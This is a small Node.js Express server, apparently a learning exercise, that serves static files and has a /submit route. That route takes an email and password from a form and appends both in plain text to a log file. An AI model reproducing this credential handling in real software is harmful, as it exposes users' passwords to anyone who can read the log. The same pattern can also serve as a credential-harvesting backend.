const express = require('express');
const path = require('path');
const fs = require('fs');
const bodyParser = require('body-parser');
const app = express();

app.use(bodyParser.urlencoded({extended: false}));

//This will only return a single file//
    // app.get('/', (req, res) => {
        
    //     res.sendFile(path.join(__dirname, '../public/index.html'));

    // });

    //This will return any files in the public folder

app.use('/', (req, res, next) => {
    console.log(req.url);
    next();
})
app.post('/submit', (req, res, next) => {
    let email = req.body.email;
    let pw = req.body.password;
    fs.appendFileSync('text.log', `${email}, ${pw} \n`)
    res.send('SUBMITTED')
    
})

app.use(express.static(path.join(__dirname, '../public')));




app.listen(3000)